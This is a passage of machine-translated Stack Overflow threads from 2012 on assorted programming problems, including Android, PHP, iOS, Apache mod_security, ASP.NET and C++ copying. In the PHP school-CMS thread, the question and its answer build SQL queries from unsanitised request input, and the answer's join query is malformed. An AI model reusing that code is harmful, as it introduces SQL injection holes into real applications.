    //update = whatever
    if(input.equalsIgnoreCase("show all"))
    {
        update=printAllRooms();
        Log.i(input, update);
    }
    else update=input; //just for testing, will delete later
} 
```

printAllRooms 函数：

```
public String printAllRooms() //for debug purposes
{
    String result = "";

    for (Iterator<Room> iterator = rooms.iterator(); iterator.hasNext();) {
        Room current = iterator.next();
        result = result + current.toString()+"\n";
        Log.i("printallrooms", current.toString());
    }
    return result;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:20:44.940

如果迭代器对您不起作用，请尝试使用 For-Each 循环：

```
for (Room r : rooms) {
    result = result + r.toString()+"\n";
    Log.i("printallrooms", r.toString());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T19:50:37.870

关于使用 Log 的说明。

发送给 Log 的第一个参数通常是一个固定字符串，指示您所在的类的名称。

因此，在您的班级顶部，您可以定义：

```
private static final String TAG = "MyClassName"; 
```

然后，您将使用 TAG 作为该类中的日志语句。

```
Log.i(TAG, "My input was: " + input + " Update was: " + update; 
```

说得客气一点，你的函数看起来很奇怪。在您的 Log 语句中设置断点，运行调试器，然后检查更新中包含的变量值。最有可能的是， printAllRooms() 没有按照您的想法进行。

# php - 回显并添加数组键

> ID：11782587
> 
> 赞同：-4
> 
> 时间：2012-08-02T17:18:49.077
> 
> 标签：php, arrays, array-key

我的数组：

```
<?php
    $fruitcolors = array('apple'=>'red', 'lemon'=>'yellow');
?> 
```

我需要知道如何呼应苹果的价值，所以它呼应“红色”。

我还需要知道如何使用 php 代码添加新值：

`$fruitcolors[] = "Pear" => "Green";`等等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:21:25.100

```
<?php
    // echo 'red'
    echo $fruitcolors['apple'];

    // assign key: 'Pear', value: 'Green'
    $fruitcolors['Pear'] = 'Green';
?> 
```

有关详细信息，请参阅[http://php.net/array](http://php.net/array)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:21:38.613

[手册](http://php.net/array)中清楚地解释了数组的基本特征：

```
echo $fruitcolors['apple'];
$fruitcolors['pear'] = 'green'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T17:22:06.600

如果你用谷歌搜索“php 数组”，这很可能在结果中：

[http://php.net/manual/en/language.types.array.php](http://php.net/manual/en/language.types.array.php)

# ios - 是否有任何选项可以将测试版本分发给 100 多名测试人员？

> ID：11782591
> 
> 赞同：0
> 
> 时间：2012-08-02T17:19:02.577
> 
> 标签：ios, xcode

我们希望在公司内部分发我们的应用程序以进行 dogfood 测试，但是测试版本的临时分发仅限于 100 台设备。有没有办法将其分发到 100 以上？

该应用程序最终将发布到 App Store，但在开发/测试期间，公司是否可以另外注册企业开发者帐户并将 dogfood 构建作为企业应用程序分发？

TIA

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:27:30.217

最好的选择是将您自己注册到企业计划而不是开发人员计划。这样您就可以将临时构建分发给公司中的每个人

链接：[https ://developer.apple.com/programs/ios/enterprise/](https://developer.apple.com/programs/ios/enterprise/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:28:23.200

您是正确的，您可以通过 Apple 配置来做到这一点的唯一官方方法是将其作为 Enterprise Ad-Hoc 应用程序发布，因为开发测试限制为 100 台设备。没有再支付 99 美元并使用另外 100 台设备……

# aptana3 - 为什么 Gnome 3 上的 Aptana 慢，Mageia 2 上的 Nvidia 慢？

> ID：11782592
> 
> 赞同：0
> 
> 时间：2012-08-02T17:19:08.050
> 
> 标签：aptana3

这是我在使用 Nvidia GeForce 8400 GS 显卡、在 Mageia 2 上运行 Gnome 3 并使用 Aptana Studio 3 时遇到的问题。

症状：滚动速度慢得令人难以忍受——例如，使用鼠标滚轮滚动可能需要八秒钟才能完成滚动。编辑等待保存也很痛苦。

我知道这与 Nvidia 卡和 Aptana 有关（请参阅我的解决方案），但有其他人经历过这种情况并有更好的解决方案吗？

此致

尼尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T10:53:11.683

取代下面建议的新解决方案。

问题似乎是 JDK、nvidia 和 gnome 3 的组合（至少在 Mageia 2 上 - 不确定 Ubuntu 等）。我最终得到的最佳解决方案是使用*没有*3D 加速的 nouveau 驱动程序，然后它又可以正常工作了。（使用 3D 加速 nouveau 目前似乎在大约 5 分钟后挂起，但与此同时 Aptana 运行良好。）

Netbeans 似乎有其他问题，而问题也出现在 Eclipse 中。在 KDE Aptana 上运行完美（在最好的情况下比在 gnome 上更快）。所以这就是为什么我认为 JDK 加 nvidia 加 gnome 3 表现不佳的原因。

另一种解决方案是使用 KDE 代替桌面。

旧解决方案：

一种解决方案：假设您使用的是 295.xxx nvidia 驱动程序（而不是 nouveau），然后在 Mageia 控制中心->硬件->设置图形服务器，在选项下，关闭“启用渲染加速”警告打开它可能会导致文本渲染出现问题。这样做似乎可以将 Aptana 加速到 nvidia 之前的速度。

但是，X 现在将消耗大量 CPU，因为它弥补了渲染加速的不足。所以这更像是一种解决方法。

我已经使用最新的 nvidia beta 版本驱动程序进行了尝试，但问题仍然存在。

这似乎是 Aptana 在滚动、重绘等时可能进行过多处理的组合，带有文本错误的 nvidia 驱动程序和 gnome 3 有点慢。例如 netbeans 似乎没有同样的问题。

# iphone - 在IOS核心音频中，如何找到文件播放器音频单元的真实当前播放头位置？

> ID：11782593
> 
> 赞同：6
> 
> 时间：2012-08-02T17:19:10.043
> 
> 标签：iphone, ios, audio, core-audio, audiounit

我有一个使用文件播放器音频单元来播放、暂停和停止音频文件的程序。我完成此操作的方法是初始化文件播放器音频单元以在零位置播放文件，然后当用户按下暂停按钮时，我停止 AUGraph，捕获当前位置，然后使用该位置作为开始位置当用户按下播放按钮时。一切正常，但每 3 或 4 次我点击暂停然后播放，这首歌在我点击暂停之前开始播放半秒到整秒。

我不知道为什么会这样，你们有什么想法吗？这是我的代码的简化版本。

```
//initialize AUGraph and File player Audio unit
...
...
...

//Start AUGraph 
...
...
...

// pause playback
- (void) pauseAUGraph {

//first stop the AuGrpah
        result = AUGraphStop (processingGraph);

// get current play head position        
        AudioTimeStamp ts;
        UInt32 size = sizeof(ts);

        result = AudioUnitGetProperty(filePlayerUnit, 
                                      kAudioUnitProperty_CurrentPlayTime, kAudioUnitScope_Global, 0, &ts, 
                                      &size);
        //save our play head position for use later
        //must add it to itself to take care of multiple presses of the pause button
        sampleFrameSavedPosition = sampleFrameSavedPosition + ts.mSampleTime; 

        //this stops the file player unit from playing
        AudioUnitReset(filePlayerUnit, kAudioUnitScope_Global, 0); 
        NSLog (@"AudioUnitReset - stopped file player from playing");

    //all done    
}

// Stop playback

- (void) stopAUGraph {
        // lets set the play head to zero, so that when we restart, we restart at the beginning of the file. 

          sampleFrameSavedPosition = 0;
        //ok now that we saved the current pleayhead position, lets stop the AUGraph
        result = AUGraphStop (processingGraph);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-13T06:07:43.917

可能您应该使用数据包计数而不是时间戳，因为您只想暂停和播放音乐，而不是显示时间信息。

有关使用此方法的示例，请参阅[BufferedAudioPlayer 。](https://github.com/iitotoro/BufferedAudioPlayer)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-07T14:16:14.047

这可能是由于您的代码的舍入问题：

例如，如果您每次按下暂停按钮，您的计时器都会在实际暂停时间之前的 0.5/4 秒处记录，您仍然会看到所需的结果。但是在再重复四次之后，您创建的空间量是 0.5/4 乘以 4，这是您似乎正在经历的半秒。

因此，我会特别注意您正在使用的对象类型，并确保它们不会不恰当地四舍五入。尝试使用 a`double float`作为您的采样时间来尝试缓解该问题！

希望这是清楚和有帮助的！:)

# hyperlink - 如何链接到特定的搜索结果？

> ID：11782599
> 
> 赞同：0
> 
> 时间：2012-08-02T17:08:55.327
> 
> 标签：hyperlink

我有一个许可证号码，我想链接到当该号码输入以下表格时我得到的具体结果：

[http://www.idfpr.com/LicenseLookUp/LicenseLookup.asp](http://www.idfpr.com/LicenseLookUp/LicenseLookup.asp)

但是，搜索结果的 URL 始终相同，并不特定于结果（URL 是：[http](http://www.idfpr.com/LicenseLookUp/results.asp) ://www.idfpr.com/LicenseLookUp/results.asp ）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:23:14.540

在 firefox 或 Google Chrome 调试器中使用诸如 firebug 之类的调试器。检查表单并将方法设置为“get”而不是“post”，然后单击按钮。

现在你可以得到这样的东西： [http ://www.idfpr.com/LicenseLookUp/results.asp?TYPE=NAME&pro_cde=0219&lnme=wew&checkbox=on&finit=A&rowcount=1&submit1.x=42&submit1.y=8](http://www.idfpr.com/LicenseLookUp/results.asp?TYPE=NAME&pro_cde=0219&lnme=wew&checkbox=on&finit=A&rowcount=1&submit1.x=42&submit1.y=8)

# ruby-on-rails - wicked_pdf 和 wkhtmltopdf 从包含大量 Javascript 内容的文件生成 PDF？

> ID：11782601
> 
> 赞同：1
> 
> 时间：2012-08-02T17:19:34.313
> 
> 标签：ruby-on-rails, ruby, pdf, wicked-pdf

有没有人使用 wicked_pdf 和 wkhtmltopdf 从 rails 生成 pdf 文件？

wkhtmltopdf ( [http://code.google.com/p/wkhtmltopdf/](http://code.google.com/p/wkhtmltopdf/) ) 是 wicked_pdf gem ( [https://github.com/mileszs/wicked_pdf](https://github.com/mileszs/wicked_pdf) ) 本质上封装的 C++ 可执行文件。它非常适合生成基本的 pdf 表格和报告。

我们现在正在寻找打印一些包含大量 javascript 内容的页面。由于处理都是在服务器端完成的，显然没有浏览器来解释 javascript。

我一直在环顾四周，可以看到 wkhtmltopdf 支持一些 Javascript，但我也看到很多人在使用它进行复杂的 javascript 渲染时遇到了问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-20T15:15:00.457

实际上那里有一个浏览器引擎。wkhtmltopdf 中的 WK 代表 webkit，它是用于呈现 HTML 和 javascript 的浏览器引擎 - Chrome 也使用该引擎。

你有什么具体的东西不起作用吗？我使用 javascript，我也看到一些非常复杂的 javascript 被使用，例如图表的生成，它们似乎工作得很好。wkhtmltopdf 经常使用的页眉和页脚也严重依赖于 javascipt。

不过我没用过红宝石。

# apache - 阻止 HTTP POST 攻击

> ID：11782605
> 
> 赞同：1
> 
> 时间：2012-08-02T17:20:05.727
> 
> 标签：apache, .htaccess, mod-rewrite, mod-security

我的服务器受到 HTTP POST 攻击，我想将所有这些请求发送到 403，而不是让它们被 mod_security 捕获，以提高拒绝速度并减轻 Apache 的负担。这是目前通过 mod_security 发生的事情：

```
[Tue Jul 31 23:40:42 2012] [error] [client 24.201.202.189] ModSecurity: Access denied with code 403 (phase 2). Operator EQ matched 0 at REQUEST_HEADERS. [file "/var/asl/rules/10_asl_rules.conf"] [line "63"] [id "390616"] [rev "2"] [msg "Atomicorp.com WAF Rules: POST request must have a Content-Length header"] [severity "WARNING"] [hostname "some-server.domain.com"] [uri "/index.php/1.0"] [unique_id "UBhQ2myulQkAADbaEm8AAACN"] 
```

我正在尝试通过 mod_rewrite 将对 index.php 的任何访问发送到 403，但它似乎不起作用。我假设这些要么不适用于 POST，要么我遗漏了一些东西。这是我现在正在使用的：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} !^http://(www\.)?some-server\.domain\.com
RewriteRule ^index\.php$ [F] 
```

服务器名称的结构与上面类似，但出于显而易见的原因，我已将其替换为一些通用名称。

任何人都可以通过 mod_rewrite 规则对此提供反馈以及我可能做错了什么吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T13:34:59.963

在这种情况下，由于攻击总是相同的，因此解决方案是这样的：

```
<LocationMatch "^/index.php/1.0">
order allow,deny
deny from all
</LocationMatch> 
```

由于攻击者从那时起总是触发“被服务器配置拒绝”，因此像这样一次性阻止它们是轻而易举的事：

```
for i in $(grep "client denied by server configuration: /usr/local/apache/htdocs/index.php" /usr/local/apache/logs/error_log | cut -d\  -f8 | tr -d ']' | sort | uniq); do csf -d $i; done 
```

问题解决了。

# php - Smarty 替换和排列

> ID：11782612
> 
> 赞同：1
> 
> 时间：2012-08-02T17:20:37.070
> 
> 标签：php, arrays, smarty

我正在为一些公寓设计一个网站。

我有一些数据在 foreach 循环中分配给 Smarty。

```
$i = 0;
foreach ($obj2 as $array) {
   $smarty->assign('name'.$i, $obj2[$i]['name']);
   $smarty->assign('numbedrooms'.$i, $obj2[$i]['number_of_bedrooms']);
   $smarty->assign('numbathrooms'.$i, $obj2[$i]['number_of_bathrooms']);
   $smarty->assign('sqfeet'.$i, $obj2[$i]['square_feet']);
   $smarty->assign('deposit'.$i, $obj2[$i]['deposit']);
   $smarty->assign('rent'.$i, $obj2[$i]['rent']);
   $smarty->assign('vacantunits'.$i, $obj2[$i]['vacant_units']);
   $i++;
} 
```

加载模板时（`$smarty->display('template.tpl');`），我希望所有数据都可以通过`replace`（例如`replace:'[[lowestrate]]':{$lowestrate}`（来自另一个代码块的示例））。

但是，由于项目的数量`$obj2`可能会发生变化（目前是 3 个），我不能只说`replace:'[[name1]]':{$name1}`. （更不用说需要多长时间了）

此外，需要替换的原因是页面内容是从带有所见即所得编辑器的 CMS 系统管理的，编辑器可以在其中键入`[[lowestrate]]`以将其替换为成本最低的公寓。他们应该能够键入`[[name1]]`以将其替换为第一间公寓的名称，或`[[numberbedrooms1]]`将其替换为公寓 1 的卧室数量。

有人知道我应该如何去做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T05:18:23.673

这听起来像是你应该在 PHP 级别而不是 smarty 级别做的工作。我建议您在分配给 smarty 之前进行替换，然后发送转换后的数组，这会容易得多（并且更清洁恕我直言）

# java - Spring mvc Web应用程序中同一浏览器的选项卡和新窗口中的会话管理

> ID：11782614
> 
> 赞同：0
> 
> 时间：2012-08-02T17:20:51.620
> 
> 标签：java, web-applications, spring-mvc, spring-security

我正在为我的 Web 应用程序使用 Spring MVC、Spring security 和 jsp。

现在我的问题是：

当用户登录应用程序并打开同一浏览器的选项卡或新窗口时，当前登录的用户应自动登录选项卡或新窗口，如 Gmail 或 Yahoo。

请帮我解决这个问题。

谢谢吉安

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:24:00.860

如果您使用 cookie 进行会话跟踪，那将是默认行为，

浏览器本身负责根据请求的路径放置正确的 cookie

# ios - 使用 Jenkins 进行 CI iOS 构建是否需要或更可取 OS X 服务器？

> ID：11782633
> 
> 赞同：0
> 
> 时间：2012-08-02T17:22:01.377
> 
> 标签：ios, jenkins, xcodebuild

我目前正在研究需要什么以及如何设置自动化 CI 构建系统来创建 iOS 应用程序。

目的是使用 Jenkins，因为它目前用于其他操作系统构建。

OS X 构建机器是否需要是 OS X 服务器或可以使用常规版本的 OS X？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:28:02.273

我们在内部使用 Jenkins 已经有一段时间了（从它仍然被称为 Hudson 的时候开始）。我们正在使用它安装在常规 OSX 客户端上。OSX 服务器不需要运行持续集成服务器。

# google-app-engine - 在谷歌应用引擎中传递静态内容时出错

> ID：11782636
> 
> 赞同：0
> 
> 时间：2012-08-02T17:22:22.400
> 
> 标签：google-app-engine, static

我有以下 app.yaml 配置文件：

```
- url: /privacy.html 
  static_files: html/privacy.html
  upload: static_files

- url: /terms.html 
  static_files: html/terms.html
  upload: static_files 
```

从网络浏览器访问 www.samplewebsite.com/privacy.html 时，它抱怨以下内容：

```
Error: Not Found

The requested URL /privacy.html was not found on this server. 
```

在本地开发服务器中一切正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T14:54:17.737

因此，正如 Sebastian Kreft 指出的那样，您的“上传：”子句是错误的。阅读他的评论以弄清楚它应该是什么。

# jsf - 必须按 p:commandButton 两次（非移动设备）

> ID：11782646
> 
> 赞同：0
> 
> 时间：2012-08-02T17:23:06.270
> 
> 标签：jsf, primefaces

我已将在 JSF 1.2 上工作的应用程序升级到 2.1，现在命令按钮出现问题。我已经检查了我能找到的关于这个主题的所有其他帖子，但它们似乎都不是在我使用 javax.faces-2.1.11、myfaces-api-2.1.9、myfaces-impl 运行 Tomcat 6.0 的相同情况下-2.1.9 和 primefaces-3.2

我有一个 h:form 包含

```
<p:commandButton action="#{invoiceController.newInvoice}" value="New Invoice" >
</p:commandButton> 
```

newInvoice 方法包含

```
public String newInvoice() {
    detailInvoice = new Invoice();
    detailInvoice.setLines(new ArrayList<InvoiceLine>());
    detailInvoice.setInvoiceNo("new");
    detailLine = new InvoiceLine();
    lines = new ArrayList<InvoiceLine>();
    return "invoicedetail";
} 
```

invoicedetails.xhtml 存在于同一文件夹中

这会呈现一个按钮，当我第一次按下它时，什么也没有发生，当我第二次按下它时，会显示 invoicedetails.xhtml。

我尝试添加 ajax="false" 但无论按下按钮多少次都没有任何反应。

这是一个如此基本的东西，我一定错过了一些东西，但无法找出它是什么。您的帮助将不胜感激

# android - 使用百分比呢？

> ID：11782648
> 
> 赞同：2
> 
> 时间：2012-08-02T17:23:08.050
> 
> 标签：android, android-layout

所以，我正在考虑百分比的使用，例如，在边距中。

我们可以使用叠加来按 dpi 大小分隔布局，但为什么不能使用百分比呢？

像这样的东西：

```
Display display = getWindowManager().getDefaultDisplay();

float width = display.getWidth();
float height = display.getHeight();

//20% of left margin
float imageMarginLeft = ( width * 20 ) / 100; 
```

然后将此边距设置为图像或任何元素。

这很糟糕吗？我只是想讨论一下。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:20:54.047

LinearLayout 可以通过使用权重来做百分比。

```
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal" 
    android:weightSum="100">

    <Button
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="20"
        android:text="Button" />
</LinearLayout> 
```

如果大量使用基于权重的布局，则会影响性能，尤其是当它们嵌套时。以编程方式执行它也可能会影响布局时间。

*编辑* 由于您正在寻找讨论，我建议基于百分比的布局通常不好。问题是物理屏幕尺寸随 Android 变化很大。Incredible 上的一半屏幕与 Galaxy S III 上的一半屏幕有很大不同，这与 Nexus 7 上的一半屏幕等有很大不同。使用 dp 单位的好处是它们与物理尺寸有关屏幕上的东西。它可以防止按钮在小屏幕上变得很小（并且难以选择），并且可以防止它们在大屏幕上变得巨大（和丑陋）。

# c# - 将值保存到视图状态并从中读取

> ID：11782654
> 
> 赞同：5
> 
> 时间：2012-08-02T17:23:36.137
> 
> 标签：c#, asp.net, viewstate, webforms

我对 .NET 不太熟悉，但我想将一个简单的值（1 到 1000 之间的数字，它是特定的高度`div`）保存到视图状态并在更新面板重新加载时检索它（在标记中某处或使用javascript）。最简单的方法是什么？

[这个页面](http://msdn.microsoft.com/en-us/library/aa287536%28v=vs.71%29.aspx)给了我以下代码：

```
string strColor;
if (Page.IsPostBack)
{
   // Retrieve and display the property value.
   strColor = (string)ViewState["color"];
   Response.Write(strColor);
}
else
   // Save the property value.
   ViewState["color"] = "yellow"; 
```

但是，我并不完全清楚在哪里或如何访问示例 strColor。

既然这是在后面的代码中，`Response.Write`那么甚至会在哪里吐出该代码呢？尝试此代码时找不到它。以及如何使用 javascript 设置该值，而不是在后面的代码中设置它？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T17:37:26.347

您可以简单地将 div 设置为服务器控件，如下所示：

```
<div id="yourdiv" runat="server" ... 
```

当页面回发时；只需通过设置它的属性来设置它的高度；例如：

```
yourDiv.Attributes("style","height:"+height_read_from_ViewState+"px;"); 
```

或者，您可以在客户端存储高度，使用隐藏字段并在服务器端读取该隐藏字段的值来设置 div 的高度。

```
<asp:hiddenfield id="hdnHeight" runat="server" /> 
```

您在 Javascript 中设置高度，如下所示：

```
function setHeight(value)
{
  document.getElementById('<%=hdnHeight.ClientID').value=value;
} 
```

并在服务器端回发：

```
yourDiv.Attributes("style","height:"+hdnHeight.Value+"px;"); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T17:33:15.397

我会将 strColor 更改为属性并将视图状态用作属性的后备存储。

```
public string strColor 
{
    get
    {
        return ViewState["strColor"];
    }
    set
    {
        ViewState["strColor"] = value;
    }

} 
```

然后你会像使用任何其他属性一样使用它：

```
if (Page.IsPostBack)
{
   // Retrieve and display the property value.
   Response.Write(strColor);
}
else
   // Save the property value.
   strColor = "yellow"; 
```

# objective-c - 在 didReceiveLocalNotification 中设置根视图控制器：导致黑色窗口

> ID：11782655
> 
> 赞同：0
> 
> 时间：2012-08-02T17:23:37.640
> 
> 标签：objective-c, cocoa-touch

我知道之前有人问过这个问题的不同版本，但我真的被困在这里。我试图让我的应用程序在获取时从我的应用程序委托推送新视图：

```
-(void)application:(UIApplication *)application didReceiveLocalNotification:(UILocalNotification *)localNotif { 
```

我把下面的代码放在那里：

```
MyViewController *myViewController = [[MyViewController alloc]init];
nvcontrol = [[UINavigationController alloc] initWithRootViewController:myViewController];
[nvcontrol.navigationBar setTintColor:[UIColor blackColor]];
self.window.rootViewController = nvcontrol; 
```

从这里，我得到一个带有黑色导航栏的黑色视图（`myViewController`不应该有）。

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:35:40.657

![在此处输入图像描述](../Images/be31939792adc0ddac5d0e95328e033b.png)

正如我上面所概述的，您可以使用故事板来设置初始视图控制器。

请注意，如果您在 storyboard 中设置了一个视图控制器，然后在应用程序委托中创建了一个视图控制器，那么您创建的视图控制器将与您在 storyboard 中的视图控制器不同。这是因为您正在创建 CLASS 的实例，但程序无法将其与您的布局相关联。

# android - 活动恢复时在 Spinner 中显示提示

> ID：11782660
> 
> 赞同：0
> 
> 时间：2012-08-02T17:23:54.913
> 
> 标签：android, user-interface, spinner

我的活动中有一个微调器，其中加载了数据库值。首次加载活动时，选择微调器以显示提示文本。当我进入下一个活动并按下后退按钮时，选择微调器以显示第一项。但是我需要在活动恢复时显示提示文本。

如何做到这一点？我需要你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:36:10.257

Plz post your first activities info (code and xml). This would help us give an accurate answer.

However, if you programmatically set your spinner with :

```
mSpinner.setSelection(0); // or whatever index you want to revert to 
```

BEFORE you start up your 2nd activity. You should be good to go.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T20:18:34.803

您所做的，要让微调器显示提示文本，请在： `onResume`方法（覆盖它）中执行。

此外，如果导致微调器显示提示文本的内容尚未设置，并且您稍后设置（在 onCreate 中的某个位置，因此将来不会再次重新显示它），您也可以覆盖`onPause`, 到取消设置。

[活动生命周期](http://developer.android.com/reference/android/app/Activity.html#ActivityLifecycle)是关键！

# itext - 使 PdfField 可见

> ID：11782663
> 
> 赞同：0
> 
> 时间：2012-08-02T17:24:13.753
> 
> 标签：itext

我创建了一个带有表格的 PDF。我设法通过收听 PdfPCellEvent 在选定的单元格中创建字段：

```
 cell.setCellEvent( new PdfPCellEvent() {
      @Override
      public void cellLayout( PdfPCell pdfPCell,
                              Rectangle rectangle,
                              PdfContentByte[] canvas ) {
         PdfContentByte pcb = canvas[canvas.length - 1];
         PdfWriter writer = pcb.getPdfWriter();

         PdfFormField field = PdfFormField.createTextField( writer, false, false, 3 );
         field.setName( "quantity " + hashCode() );
         field.setFieldFlags( PdfFormField.FF_EDIT );
         Rectangle rect = new Rectangle( rectangle.getLeft() + 5, rectangle.getTop() - 5,
                     rectangle.getLeft() + rectangle.getWidth() - 5,
                     rectangle.getTop() - rectangle.getHeight() + 5);
         field.setWidget( rect, PdfAnnotation.HIGHLIGHT_OUTLINE );
         field.setFieldFlags( PdfAnnotation.FLAGS_PRINT );

         writer.addAnnotation( field );
         writer.flush();
      }
   }  ); 
```

就在字段中输入文本而言，它工作正常。但是一旦领域失去焦点，内容就会消失。如果我再次将焦点设置到该字段，则数据会重新出现。

我的问题是：我需要做什么才能使 PdfFormField 中的文本保持打印状态？

这里有一个示例 PDF：http: [//qr.sertal.ch/output.pdf](http://qr.sertal.ch/output.pdf)

感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:10:07.617

我从 iText 邮件列表中得到了答复。不推荐使用书中描述的添加表单字段的方法。这是新方法，效果很好：

```
 cell.setCellEvent( new PdfPCellEvent() {
      @Override
      public void cellLayout( PdfPCell pdfPCell,
                              Rectangle rectangle,
                              PdfContentByte[] canvas ) {
         PdfContentByte pcb = canvas[canvas.length - 1];
         PdfWriter writer = pcb.getPdfWriter();

         Rectangle rect = new Rectangle( rectangle.getLeft() + 5, rectangle.getTop() - 5,
                     rectangle.getLeft() + rectangle.getWidth() - 5,
                     rectangle.getTop() - rectangle.getHeight() + 5 );
         TextField field = new TextField( writer, rectangle, "quantity " + hashCode() );
         field.setRotation( A4.rotate().getRotation() );
         try {
            writer.addAnnotation(field.getTextField());
         } catch ( IOException e ) {
            e.printStackTrace();
         } catch ( DocumentException e ) {
            e.printStackTrace();
         }
         writer.flush();

         pcb.rectangle( rect );
      }
   } ); 
```

我在横向页面上的方向上遇到了最多的问题，直到我发现你可以设置字段的旋转。

# php - 在我的 CMS php 中将类名分组在一起

> ID：11782664
> 
> 赞同：1
> 
> 时间：2012-08-02T17:24:22.443
> 
> 标签：php, mysql

我已经完成了一个 CMS 学校系统，该系统是我从头开始创建的，用于在 php 中进行练习。我的问题是，例如我有会计 101、计算机科学 101，但是会计 101 必须有多次。例如：工单 1035、1036 都是会计 101，它们应该出现在同一个表中，但在我的代码中它显示了它们在不同的班级。这是我的代码。

```
if(isset($_GET['id']))
{
    $category = $_GET['id'];
    $sql = "SELECT * FROM classes WHERE category_id = " . $category;
    $query2 = mysql_query($sql) or die(mysql_error());

    while($row = mysql_fetch_object($query2))
    {
    ?>

    <center><h3><?php echo $row->class_name . '-' . $row->units; ?>  </h3></center>
    <table border ="0" wdith="100%">
    <tr>
    <td>
    <strong>Description: </strong>
    <?php echo $row->class_description; ?>
    </tr>
    </td>
    </table>
    <br/>
    <table border="1" width="44%">
<tr>
    <td width="60"><b>Ticket</b> </td>
    <td width="123"><b>Days</b></td>
    <td width="120"><b>Hours</b></td>
    <td width="64"><b>Room</b></td>
    <td><b>Instructor</b></td>
</tr>

    <tr>
    <td width="60"> <?php echo $row->ticket; ?> </td>
    <td width="123"><?php echo $row->days; ?></td>
    <td width="120"><?php echo $row->start_hours . $row->time_format . '-' . $row->end_hours . $row->time_format2 ;  ?> </td>
    <td width="64"> <?php echo $row->room_number; ?></td>
    <td><?php echo $row->instructor_name;  ?></td>
</tr> 
```

```
 }//end while

}//end if 
```

它在不同的表中显示具有不同票证的会计 101，但它应该全部在 1 个表中。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:29:29.250

如果您试图在记录中获取记录，则需要一个双循环。例如：

```
while ($row1 = mysql_fetch_object($query1))
{
  echo $row1->ParentName;

  $query2 = 'select * from `mytable` where `myForeignKey` = ' . $row1->ParentId;

  while ($row2 = mysql_fetch_object($query2))
  {
    echo $row2->ChildName;
  }
} 
```

您也可以进行左连接。让我知道你是否需要一个样本。

编辑：

左连接将像这样完成：

```
$sql = "select * from `classes` as a where category_id = '{$category}' left join `tickets` as b on a.id = b.class_id" 
```

参考。 [http://www.w3schools.com/sql/sql_join_left.asp](http://www.w3schools.com/sql/sql_join_left.asp)

# c++ - 如何在 C++ 中进行深度复制

> ID：11782666
> 
> 赞同：1
> 
> 时间：2012-08-02T17:24:27.160
> 
> 标签：c++

我正在尝试对 class 进行深层复制`B`，但 A 没有设置。

为什么`b3->print`返回垃圾号而不是`1`？

据我了解， b2 和 b3 都指向同一个 A 对象。但是我使用 B 的复制构造函数在堆上创建了一个新对象。那么为什么他们仍然指向同一个对象呢？

我希望这是有道理的。

```
#include <cstdlib>
#include <iostream>

using namespace std;

class A{
      int num;
public:
       A(int n):num(n){ cout<< "A "<< num << " constructor" <<endl;}  
       ~A(){ cout<< "A "<< num <<" destructor. " <<endl; }   

       int print(){
        cout<< num<< endl;
       }
};

class B{
      A *a;
      int num;
public:
       B(int n):num(n){
           a = new A(n);
           cout<< "B "<< num <<" constructor" <<endl;    
       }  
       ~B(){
            delete a; 
            cout<< "B "<< num <<" destructor"<<endl; 
       }    
       // Copy contructor
       B(const B & b): a(new A(b.num)){ 
       } 

       <strike>int<\strike> void print(){
        cout<< num << endl;
       }

       int get_num(){
           return num;
       }
};

int main(int argc, char *argv[])
{ 
    B *b2 = new B(1);
    B *b3(b2);
    b2->print();
    delete b2;
    b3->print();
    system("PAUSE");
    return EXIT_SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-02T17:26:29.640

`B *b3(b2);`不按你的想法做。

它相当于`B* b3 = b2`. 指针将指向相同的位置。当你这样做的时候`delete b2;`，你也释放了指向的内存`b3`。

要进行深层复制，请执行以下操作：

```
 B* b3 = new B(*b2); 
```

这里还有未定义的行为：

```
int print(){
   cout<< num << endl;
} 
```

因为你永远不会回来。将返回类型更改为`void`.

要获得预期值：

```
B(const B & b): a(new A(b.num)), num(b.num){ 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:46:36.677

这个问题的其他答案将解释指针是如何工作的，但您也应该了解不使用指针是更好的解决方案。C++ 的默认行为适用于值语义。如果您按值保存对象，则默认复制 ctor 和赋值运算符将执行“深度复制”。

```
class B{
    A a;
    int num;
public:
    B(int n): a(n), num(n){
        cout<< "B "<< num <<" constructor" <<endl;    
    }    

    void print(){
        cout<< num << endl;
    }

    int get_num(){
        return num;
    }
}; 
```

此外，如果您确实使用拥有指针，您通常应该使用智能指针。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:29:40.780

